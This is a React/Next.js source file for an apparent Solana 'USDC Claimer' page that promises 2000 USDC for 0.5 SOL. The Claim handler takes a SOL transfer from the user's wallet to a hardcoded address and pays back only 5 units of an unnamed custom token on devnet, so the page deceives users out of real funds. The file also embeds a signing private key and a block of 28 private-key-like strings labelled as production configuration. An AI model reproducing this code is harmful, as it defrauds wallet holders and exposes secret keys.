/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "xioUfP9GcnrSgmcAqyVmnf4eHY4wxucXkY4rmCFR2J3Es3zF63hd112fFUEXgV9hWzcs8bV4XUrDPajfLkfDXPs"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "UCdtgr7nnG778Fg77YAu5hJbNRkR1NNSGWF3Swys69sehguzqvfyRw5yWdeRFXBedk161yZGcFCKNLi8B3j2uzZ",
  "key1": "56PnZV7Ji718SmNhNLPRdXwoBzn8RtbBxZ8zgjUCGHjgfX3ihBrYgwifiZZLQMaVmrQZuNoqSGmqS6rbvSdhzbo5",
  "key2": "45LbxEu72p3FaWYCKydgLujNzqd7ZswD2rwPdt6HaypFtmcYJUJSXpWU7ZyzXb9wyYiKoboV2iTUr3k7pTJq7Zrq",
  "key3": "3ZyKNtyATxeFgf6LtujNLbp8ZVLp9r4iNyrsAT67Mt9Pa5QkrX6gwwxTknBbymEaYv1ggZpkeu44qNQXfwX1aEPf",
  "key4": "2HiwKoRApKkKT6v19pyk1HWZnorvvGzbRU3T4wZ2ZQuwVKMHGD2vhQaxzfMjM5ej3NSdoKLPNapBHHx9tE63eDeQ",
  "key5": "2jn1t8ZzemWTAyVLhFezi8gYfXM1aSrjCvMVDtdbd1eU9hstpRihwF91TMudMrw79P6QqHv9P3sJJ42dHJNV52Qk",
  "key6": "47MkwirczFG3gsParDYQViAM1Amd9F1DTMDNGVi5xkcGAJ1T53bM4A1spdD9Not7bURNRmqUe3Mi9U6ouo1zdB6L",
  "key7": "2YqgG86UXcZpu6xUWSiBBdsPDunH3aB2bXdiR8pHnqLSdLcWP9qBW93PPyVCW4T5Bg7VrRV7toxE2m8KPS79ysyC",
  "key8": "jeYD1s7L8aWLdZJWBsFuMTfCqewW8AWHGL9NpQc2TBkAUxKBnsBbaDr9tJMr1GWw3FdRJU8nmLpmg6fKH3tbs23",
  "key9": "37DkqLUQP6WBGzVgbuQGuruvnQd64xaMtsMG84efagaafTh9Ep89gNgcK6wNMpk8zmPZ11ssoY4yJDq29UUpEPPr",
  "key10": "2d9aqotGJRWC3HLM87mhpKg8HFZHPLodZ9g2KoTpyKoeK2p5cPRMG4zKU5fdmL7GtxfyWcnsS6BHKRY9sdjL7BGe",
  "key11": "4BdNa64J3zqH49CLhSoCZpZRZdZwHneJb7c8qTaWbVXcszzo3HXYeret5iPewKX5rSac9MFrfyxy1Y17FffTFcf3",
  "key12": "imuwEynGA86S1yhWCPSnZN8jMRQwqwU3wfxeTyqaUrwdghpTCcWs1r4nrDjTjY2wYNFvJZSNAxFg6aLz246p7Tv",
  "key13": "2rtPuH2bcDN3AiMpU4TSXYhz2yCt3UCbsdqz6Uj6T1xzj21DV5dtkkYHXkPkA7XYXhASnm5sXy9ZZpv5B364xokG",
  "key14": "2vg55in5WSm6PtKgjbhh5ezCv4MeLE6LE5ui77D3afdVnsRTGjJi1ke5MuG14w42rVAYT7LVkenDzpwP3CminfNE",
  "key15": "5gDBoz4kNGZjAua5jQBXZtrzc7WpPNTUBLfbhrebhEFwKGQfQLzStrWi6KnHTXJLg5GKQ2B2dzes7hS6j5ZMhRXh",
  "key16": "4jDWCe4TP6U8W8SpYgLwRRYWFQmJzakF7C7k1NYw1tVGE9YQT9Gtcje2VzdUokYeAWjKyEod7wNFTzpL6hhPTVn2",
  "key17": "3WKFCLhbE2sv4L3Gg4cAeXQgkHud1wiHCn3yWYsixksago1GJRfp7QvH3sgR1PtchM3GERekdsYjn3BeDqFrMUCz",
  "key18": "4dP6yWc8sP8YBHryEAWJuudjTN9tvxpPr9qwFe5RekHpKJcNfGQjUzXUJQx1rz6KZGb9cLpQJsMC26RUuEGkCMjG",
  "key19": "5Cm3wM8LyWijXzKSTx3h9qMn2yNzQQjmpeSM85mjZobhnDdA7SnaaLHCRrRosw78a5SFuUVzuMCWdSnAhqjkKh6V",
  "key20": "2TUNxXvWT3KhMxTya3FQ2wjc5ETBKZk86P9JeT7giE9Jt3yjw7seHBir6fa1YPkZG8hinyPAYznJF3v3HqnnZdCD",
  "key21": "3AuFUmNXHmnkrSkSi5iCgwQw8gmJ7VeFiKdq3rC8a8BsQmrvNSG61sxBbc1Q1Zj1qGnWGXbNhbsU745Ph6rFyjUF",
  "key22": "5Qmre56YnJqKUSsVpoKKJE3x7N2Wv3CVJvpKnC4CEWPXFK6pPZ43J7ukyFawZ5xNHvtm8yfs6jFBisvq8nRQYHD6",
  "key23": "5aAVMrpVY5uJVyAa58Q5vfKoyuwXNAvhn2rnUueNbBxKzGbkitBs1XqC4e6hFvxyd75j1W9XSypB26UmHTni25DE",
  "key24": "B8LepSN16AXBJPhdVBcPE498qgkEZmA5DLfT5exrVebo1ctpNuhE3W3PiidBtWHzyCSRTDNBpCHsHQyhUFRX5iG",
  "key25": "5ZDQrQxs6nvUH6MayHPeAf22FhQZpbL1LvNVCvtEXJY7rxH1pm6y7DkKCDuSc9rqFz8EehURR1E8x6WS4aRboXNN",
  "key26": "61qTsXNMSQWhXdP2cFq5m2K34fHue6WFnw4y4UbX2rEtPJEGv428v8kMBfW1ghyk1edvbhPRTHA9pE5MVt8zKUxa",
  "key27": "3PG6H3sTXgJ4y2HAJhRXFeSdbvRvdQNHXCBjwbfV2r2dagHAftuM7GKrap6efkkUmLRegbFQLxpZ7JRConohPNNu"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
